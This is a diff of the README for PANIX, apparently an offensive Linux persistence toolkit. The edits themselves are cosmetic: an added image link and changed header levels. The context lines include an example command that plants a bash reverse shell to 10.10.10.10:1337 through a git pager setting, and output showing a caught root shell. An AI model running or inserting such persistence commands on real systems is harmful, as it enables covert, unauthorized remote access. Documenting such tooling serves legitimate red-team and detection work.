@@ -94,6 +94,8 @@ PANIX/
 
 This streamlined structure promotes efficient development, testing, and deployment of persistence features.
 
+![](https://i.imgur.com/waxVImv.png)
+
 # Getting Started
 Getting PANIX up-and-running is as simple as downloading the script from the [release page](https://github.com/Aegrah/PANIX/releases/tag/panix-v2.0.0) and executing it:
 ```
@@ -163,7 +165,7 @@ Root User Options:
 # Examples
 The script should be largely self-explanatory, however, this section will show a few examples of how to work with PANIX.
 
-### Help & Example Menu
+## Help & Example Menu
 Every persistence mechanism has a separate help menu:
 
 ```
@@ -194,7 +196,7 @@ Examples:
 ./panix.sh --git --custom --command "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & ${PAGER:-less}" --path "~/.gitconfig --pager"
 ```
 
-### Execution
+## Execution
 Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
 
 ```
@@ -257,7 +259,7 @@ connect to [192.168.211.131] from (UNKNOWN) [192.168.211.130] 43400
 root@ubuntu2204:~#
 ```
 
-### Revert Mechanism
+## Revert Mechanism
 PANIX can clean its mess through the `--revert` command. Both for seperate modules:
 
 ```
@@ -315,7 +317,7 @@ Error: 'at' binary is not present. Cannot revert 'at' jobs.
 [+] Reversion of all modules complete.
 ```
 
-### MITRE ATT&CK Matrix
+## MITRE ATT&CK Matrix
 PANIX has a built-in MITRE ATT&CK matrix that displays the techniques and sub-techniques available. 
 
 ```
